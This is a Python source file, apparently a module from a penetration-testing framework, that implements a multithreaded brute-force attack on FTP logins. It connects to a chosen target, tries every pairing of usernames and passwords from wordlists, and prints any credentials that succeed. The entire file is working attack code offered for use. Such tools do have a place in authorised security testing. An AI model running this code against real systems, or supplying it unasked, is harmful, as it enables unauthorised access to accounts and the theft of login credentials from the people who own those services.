import ftplib
import itertools
import socket
import threading

import Wordlists
from Base.Exploits import Exploit, Option
from Utils import multi, print_error, print_success, print_status, printTable, LockedIterator, boolify


class Exploit(Exploit):
    """
    Module performs bruteforce attack against FTP service.
    If valid credentials are found, they are displayed to the user.
    """

    __info__ = {
        'name': 'credentials/ftp/bruteforce',
        'display_name': 'FTP Credential Bruteforce',
        'description': 'Module performs bruteforce attack against FTP service.'
                       'If valid credentials are found, they are displayed to the user.',
        'authors': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',
            'D0ubl3G <d0ubl3g[at]protonmail.com>',
        ],
        'references': [
            'https://github.com/dark-lbp/isf',
        ],
        'devices': [
            'Multi',
        ],
    }

    target = Option('', 'Target IP address or file with target:port (file://)')
    port = Option(21, 'Target port')

    threads = Option(8, 'Number of threads')
    usernames = Option('admin', 'Username or file with usernames (file://)')
    passwords = Option(Wordlists.passwords, 'Password or file with passwords (file://)')
    verbosity = Option('yes', 'Display authentication attempts')
    stop_on_success = Option('yes', 'Stop on first valid authentication attempt')

    credentials = []

    def run(self):
        self.credentials = []
        self.attack()

    def check(self):
        pass

    @multi
    def attack(self):
        ftp = ftplib.FTP()
        try:
            ftp.connect(self.target, port=int(self.port), timeout=10)
        except (socket.error, socket.timeout):
            print_error("Connection error: %s:%s" % (self.target, str(self.port)))
            ftp.close()
            return
        except:
            pass
        ftp.close()

        if self.usernames.startswith('file://'):
            usernames = open(self.usernames[7:], 'r')
        else:
            usernames = [self.usernames]

        if self.passwords.startswith('file://'):
            passwords = open(self.passwords[7:], 'r')
        else:
            passwords = [self.passwords]

        collection = LockedIterator(itertools.product(usernames, passwords))

        self.run_threads(self.threads, self.target_function, collection)

        if len(self.credentials):
            print_success("Credentials found!")
            headers = ("Target", "Port", "Login", "Password")
            printTable(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        module_verbosity = boolify(self.verbosity)
        name = threading.current_thread().name

        print_status(name, 'process is starting...', verbose=module_verbosity)

        ftp = ftplib.FTP()
        while running.is_set():
            try:
                user, password = data.next()
                user = user.strip()
                password = password.strip()
            except StopIteration:
                break
            else:
                retries = 0
                while retries < 3:
                    try:
                        ftp.connect(self.target, port=int(self.port), timeout=10)
                        break
                    except (socket.error, socket.timeout):
                        print_error("{} Connection problem. Retrying...".format(name), verbose=module_verbosity)
                        retries += 1

                        if retries > 2:
                            print_error("Too much connection problems. Quiting...", verbose=module_verbosity)
                            return

                try:
                    ftp.login(user, password)

                    if boolify(self.stop_on_success):
                        running.clear()

                    print_success("Target: {}:{} {}: Authentication succeed - Username: '{}' Password: '{}'"
                                  .format(self.target, self.port, name, user, password), verbose=module_verbosity)
                    self.credentials.append((self.target, self.port, user, password))
                except:
                    print_error("Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'"
                                .format(self.target, self.port, name, user, password), verbose=module_verbosity)

                ftp.close()

        print_status(name, 'process is terminated.', verbose=module_verbosity)
